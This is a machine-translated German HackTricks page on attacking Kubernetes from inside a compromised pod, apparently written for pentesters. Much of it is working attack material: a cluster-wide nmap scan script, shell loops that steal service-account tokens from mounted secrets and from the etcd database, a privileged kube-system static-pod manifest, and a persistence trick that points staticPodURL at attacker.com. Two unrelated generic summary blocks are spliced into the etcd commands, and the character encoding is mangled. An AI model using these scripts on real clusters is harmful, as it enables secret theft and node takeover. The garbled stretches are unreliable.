# Angriff auf Kubernetes von innerhalb eines Pods

{% hint style="success" %}
Lernen Sie & √ºben Sie AWS-Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lernen Sie & √ºben Sie GCP-Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
{% endhint %}

## **Pod-Ausbruch**

**Wenn Sie Gl√ºck haben, k√∂nnten Sie m√∂glicherweise daraus entkommen und zum Knoten gelangen:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Ausbruch aus dem Pod

Um aus den Pods auszubrechen, m√ºssen Sie m√∂glicherweise zuerst **Berechtigungen eskalieren**, einige Techniken dazu:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Sie k√∂nnen diese **Docker-Ausbr√ºche √ºberpr√ºfen, um auszubrechen**, aus einem Pod, den Sie kompromittiert haben:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Ausnutzen von Kubernetes-Berechtigungen

Wie im Abschnitt √ºber **Kubernetes-Enumeration** erkl√§rt:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Werden die Pods normalerweise mit einem **Service Account Token** darin ausgef√ºhrt. Dieser Service-Account kann einige **Berechtigungen haben**, die Sie m√∂glicherweise **ausnutzen** k√∂nnen, um zu anderen Pods zu **wechseln** oder sogar zu den Knoten zu **entkommen**, die im Cluster konfiguriert sind. √úberpr√ºfen Sie, wie das funktioniert unter:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Ausnutzen von Cloud-Berechtigungen

Wenn der Pod in einer **Cloud-Umgebung** ausgef√ºhrt wird, k√∂nnten Sie in der Lage sein, ein **Token vom Metadaten-Endpunkt zu leaken** und Berechtigungen damit zu eskalieren.

## Suche nach anf√§lligen Netzwerkdiensten

Da Sie sich in der Kubernetes-Umgebung befinden, sollten Sie, wenn Sie die Berechtigungen der aktuellen Pods nicht missbrauchen k√∂nnen und nicht aus dem Container entkommen k√∂nnen, nach potenziell anf√§lligen Diensten suchen.

### Dienste

**Zu diesem Zweck k√∂nnen Sie versuchen, alle Dienste der Kubernetes-Umgebung zu erhalten:**
```
kubectl get svc --all-namespaces
```
Standardm√§√üig verwendet Kubernetes ein flaches Netzwerkschema, was bedeutet, dass **jedes Pod/Service innerhalb des Clusters mit anderen kommunizieren kann**. Die **Namespaces** innerhalb des Clusters **haben standardm√§√üig keine Netzwerksicherheitsbeschr√§nkungen**. Jeder im Namespace kann mit anderen Namespaces kommunizieren.

### Scannen

Das folgende Bash-Skript (entnommen aus einem [Kubernetes-Workshop](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) installiert und scannt die IP-Bereiche des Kubernetes-Clusters:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
Schauen Sie sich die folgende Seite an, um zu erfahren, wie Sie **Kubernetes-spezifische Dienste angreifen** k√∂nnen, um **andere Pods/die gesamte Umgebung zu kompromittieren**:

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

### Sniffing

Falls der **kompromittierte Pod einen sensiblen Dienst ausf√ºhrt**, bei dem andere Pods sich authentifizieren m√ºssen, k√∂nnten Sie in der Lage sein, die Anmeldeinformationen abzurufen, die von anderen Pods gesendet werden, indem Sie **lokale Kommunikationen abh√∂ren**.

## Netzwerk-Spoofing

Standardm√§√üig funktionieren Techniken wie **ARP-Spoofing** (und dank dessen **DNS-Spoofing**) im Kubernetes-Netzwerk. Dann, innerhalb eines Pods, wenn Sie die **NET\_RAW-F√§higkeit** haben (die standardm√§√üig vorhanden ist), k√∂nnen Sie benutzerdefinierte Netzwerkpakete senden und **MitM-Angriffe √ºber ARP-Spoofing auf alle Pods durchf√ºhren, die auf demselben Knoten ausgef√ºhrt werden.**\
Dar√ºber hinaus, wenn der **b√∂sartige Pod** auf dem **gleichen Knoten wie der DNS-Server** l√§uft, k√∂nnen Sie einen **DNS-Spoofing-Angriff auf alle Pods im Cluster** durchf√ºhren.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## Node DoS

In den Kubernetes-Manifesten gibt es keine Spezifikation von Ressourcen und **keine angewendeten Grenzen f√ºr die Container.** Als Angreifer k√∂nnen wir **alle Ressourcen verbrauchen, auf denen der Pod/Deployment l√§uft,** und andere Ressourcen verhungern lassen und eine DoS f√ºr die Umgebung verursachen.

Dies kann mit einem Tool wie [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng) durchgef√ºhrt werden:
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
Du kannst den Unterschied sehen, w√§hrend `stress-ng` l√§uft und danach.
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## Knoten Post-Exploitation

Wenn es Ihnen gelungen ist, **aus dem Container auszubrechen**, finden Sie einige interessante Dinge im Knoten:

- Der **Container-Runtime**-Prozess (Docker)
- Weitere **Pods/Container**, die auf dem Knoten ausgef√ºhrt werden und die Sie missbrauchen k√∂nnen (mehr Tokens)
- Das gesamte **Dateisystem** und das **Betriebssystem** im Allgemeinen
- Der **Kube-Proxy**-Dienst lauscht
- Der **Kubelet**-Dienst lauscht. √úberpr√ºfen Sie die Konfigurationsdateien:
  - Verzeichnis: `/var/lib/kubelet/`
  - `/var/lib/kubelet/kubeconfig`
  - `/var/lib/kubelet/kubelet.conf`
  - `/var/lib/kubelet/config.yaml`
  - `/var/lib/kubelet/kubeadm-flags.env`
  - `/etc/kubernetes/kubelet-kubeconfig`
- Andere **√ºbliche Kubernetes-Dateien**:
  - `$HOME/.kube/config` - **Benutzerkonfiguration**
  - `/etc/kubernetes/kubelet.conf`- **Regul√§re Konfiguration**
  - `/etc/kubernetes/bootstrap-kubelet.conf` - **Bootstrap-Konfiguration**
  - `/etc/kubernetes/manifests/etcd.yaml` - **etcd-Konfiguration**
  - `/etc/kubernetes/pki` - **Kubernetes-Schl√ºssel**

### Knoten kubeconfig finden

Wenn Sie die kubeconfig-Datei nicht in einem der zuvor kommentierten Pfade finden k√∂nnen, **√ºberpr√ºfen Sie das Argument `--kubeconfig` des Kubelet-Prozesses**:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### Geheimnisse stehlen
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
Das Skript [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) wird automatisch **die Tokens anderer Pods abrufen und √ºberpr√ºfen, ob sie die gesuchte Berechtigung haben** (anstatt dass du jeden einzelnen √ºberpr√ºfen musst):
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### Privileged DaemonSets

Ein DaemonSet ist ein **Pod**, der in **allen Knoten des Clusters** ausgef√ºhrt wird. Wenn ein DaemonSet mit einem **privilegierten Servicekonto** konfiguriert ist, k√∂nnen Sie in **ALLEN Knoten** das **Token** dieses **privilegierten Servicekontos** finden, das Sie missbrauchen k√∂nnten.

Der Exploit ist derselbe wie im vorherigen Abschnitt, aber jetzt sind Sie nicht mehr vom Gl√ºck abh√§ngig.

### Pivot to Cloud

Wenn der Cluster von einem Cloud-Dienst verwaltet wird, hat der **Knoten in der Regel einen anderen Zugriff auf das Metadaten**-Endpunkt als der Pod. Versuchen Sie daher, **vom Knoten aus auf den Metadaten-Endpunkt zuzugreifen** (oder von einem Pod mit hostNetwork auf True):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### Steal etcd

Wenn Sie den [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) des Knotens angeben k√∂nnen, auf dem der Container ausgef√ºhrt wird, erhalten Sie eine Shell innerhalb eines Steuerungsebenenknotens und erhalten die **etcd-Datenbank**:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-plane-Knoten haben die **Rolle Master** und in **cloud-managed Clustern k√∂nnen Sie darin nichts ausf√ºhren**.

#### Geheimnisse aus etcd lesen

Wenn Sie Ihren Pod auf einem control-plane-Knoten mit dem `nodeName`-Selektor in der Pod-Spezifikation ausf√ºhren k√∂nnen, haben Sie m√∂glicherweise einfachen Zugriff auf die `etcd`-Datenbank, die alle Konfigurationen f√ºr den Cluster enth√§lt, einschlie√ülich aller Geheimnisse.

Nachfolgend finden Sie eine schnelle und einfache M√∂glichkeit, Geheimnisse aus `etcd` abzurufen, wenn es auf dem control-plane-Knoten l√§uft, auf dem Sie sich befinden. Wenn Sie eine elegantere L√∂sung w√ºnschen, die einen Pod mit dem `etcd`-Client-Dienstprogramm `etcdctl` startet und die Anmeldeinformationen des control-plane-Knotens verwendet, um eine Verbindung zu `etcd` herzustellen, egal wo es ausgef√ºhrt wird, werfen Sie einen Blick auf [dieses Beispielmanifest](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) von @mauilion.

**√úberpr√ºfen Sie, ob `etcd` auf dem control-plane-Knoten ausgef√ºhrt wird, und sehen Sie, wo sich die Datenbank befindet (Dies ist auf einem mit `kubeadm` erstellten Cluster)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
```markdown
## Attacking Kubernetes from Inside a Pod

### Introduction

When an attacker gains access to a Kubernetes pod, they are in a privileged position to perform further attacks within the cluster. This section explores various techniques that an attacker can use to escalate privileges and move laterally within the Kubernetes cluster.

### Escalating Privileges

#### Accessing the Kubernetes API

One common technique is to access the Kubernetes API from within a compromised pod. This can be achieved by mounting the service account token or by using tools like `kubectl` within the pod.

#### Exploiting Kubernetes Secrets

Attackers can also attempt to access Kubernetes secrets from within a compromised pod. These secrets may contain sensitive information such as passwords, API keys, or certificates.

### Moving Laterally

#### Pod Hopping

Once inside a pod, an attacker can move laterally by compromising other pods within the same node or different nodes in the cluster. This can be done by exploiting misconfigurations or vulnerabilities in the cluster.

#### Accessing Cluster Resources

By escalating privileges and moving laterally, an attacker can eventually gain access to cluster-wide resources such as nodes, services, and configurations. This can have severe consequences for the entire Kubernetes cluster.

### Conclusion

Securing Kubernetes pods is crucial to prevent attackers from escalating privileges and moving laterally within the cluster. Regular security audits, proper RBAC configurations, and network policies can help mitigate the risks associated with pod compromise.
```
```bash
data-dir=/var/lib/etcd
```
**Zeigen Sie die Daten in der etcd-Datenbank an:**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**Extrahiere die Tokens aus der Datenbank und zeige den Namen des Service-Accounts an**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**Derselbe Befehl, aber einige Greps, um nur das Standard-Token im kube-system-Namespace zur√ºckzugeben**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
```markdown
# Angriff auf Kubernetes von innerhalb eines Pods

In einer Umgebung, in der ein Angreifer Zugriff auf ein Kubernetes-Pod hat, gibt es verschiedene Angriffsm√∂glichkeiten, um die Sicherheit zu kompromittieren. Einige dieser Angriffe umfassen:

1. **Pod-Flucht**: Ein Angreifer kann versuchen, aus einem Pod auszubrechen und auf andere Pods im Cluster zuzugreifen.
   
2. **Pod-Spoofing**: Durch Manipulation von Umgebungsvariablen oder anderen Pod-Informationen kann ein Angreifer versuchen, sich als ein anderer legitimer Pod auszugeben.
   
3. **Pod-Manipulation**: Ein Angreifer kann versuchen, den Inhalt eines Pods zu manipulieren, um b√∂sartigen Code einzuschleusen oder sensible Daten abzufangen.
   
Es ist wichtig, Sicherheitsvorkehrungen zu treffen, um diese Angriffe zu verhindern, z. B. die Verwendung von Netzwerkrichtlinien, die Begrenzung von Pod-Berechtigungen und die regelm√§√üige √úberpr√ºfung der Pod-Sicherheit.
```
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### Statische/gespiegelte Pods Persistenz

_Statische Pods_ werden direkt vom kubelet-Daemon auf einem bestimmten Knoten verwaltet, ohne dass der API-Server sie beobachtet. Im Gegensatz zu Pods, die vom Steuerungsebene verwaltet werden (zum Beispiel, ein Deployment); stattdessen **√ºberwacht der kubelet jeden statischen Pod** (und startet ihn neu, wenn er fehlschl√§gt).

Deshalb sind statische Pods immer **an ein Kubelet** auf einem bestimmten Knoten gebunden.

Der **kubelet versucht automatisch, f√ºr jeden statischen Pod einen Spiegelpod auf dem Kubernetes-API-Server zu erstellen**. Das bedeutet, dass die auf einem Knoten ausgef√ºhrten Pods auf dem API-Server sichtbar sind, aber nicht von dort aus gesteuert werden k√∂nnen. Die Pod-Namen werden mit dem Knoten-Hostname mit einem f√ºhrenden Bindestrich versehen.

{% hint style="danger" %}
Die **`spec` eines statischen Pods kann nicht auf andere API-Objekte verweisen** (z. B. ServiceAccount, ConfigMap, Secret, usw.). **Sie k√∂nnen dieses Verhalten also nicht missbrauchen, um einen Pod mit einem beliebigen ServiceAccount zu starten**, um den Cluster zu kompromittieren. Aber Sie k√∂nnten dies verwenden, um Pods in verschiedenen Namespaces auszuf√ºhren (falls das aus irgendeinem Grund n√ºtzlich ist).
{% endhint %}

Wenn Sie sich im Knotenhost befinden, k√∂nnen Sie ihn dazu bringen, einen **statischen Pod innerhalb sich selbst zu erstellen**. Dies ist ziemlich n√ºtzlich, da es Ihnen m√∂glicherweise erm√∂glicht, einen Pod in einem anderen Namespace wie **kube-system** zu erstellen.

Um einen statischen Pod zu erstellen, sind die [**Dokumente eine gro√üe Hilfe**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). Sie ben√∂tigen im Grunde 2 Dinge:

* Konfigurieren Sie den Parameter **`--pod-manifest-path=/etc/kubernetes/manifests`** im **kubelet-Dienst** oder in der **kubelet-Konfiguration** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) und starten Sie den Dienst neu
* Erstellen Sie die Definition im **Pod-Definition** in **`/etc/kubernetes/manifests`**

**Ein weiterer unauff√§lligerer Weg w√§re:**

* √Ñndern Sie den Parameter **`staticPodURL`** in der **kubelet**-Konfigurationsdatei und setzen Sie etwas wie `staticPodURL: http://attacker.com:8765/pod.yaml`. Dadurch wird der kubelet-Prozess einen **statischen Pod** erstellen, der die **Konfiguration von der angegebenen URL** erh√§lt.

**Beispiel** einer **Pod**-Konfiguration zur Erstellung eines privilegierten Pods in **kube-system** entnommen von [**hier**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### L√∂schen von Pods + nicht planbare Knoten

Wenn ein Angreifer einen **Knoten kompromittiert** hat und er **Pods von anderen Knoten l√∂schen** und **andere Knoten daran hindern kann, Pods auszuf√ºhren**, werden die Pods auf dem kompromittierten Knoten erneut gestartet und er wird in der Lage sein, **die Tokens zu stehlen**, die in ihnen ausgef√ºhrt werden.\
F√ºr [**weitere Informationen folgen Sie diesen Links**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## Automatische Tools

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

{% hint style="success" %}
Lernen Sie & √ºben Sie AWS-Hacking: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lernen Sie & √ºben Sie GCP-Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys einreichen.

</details>
{% endhint %}
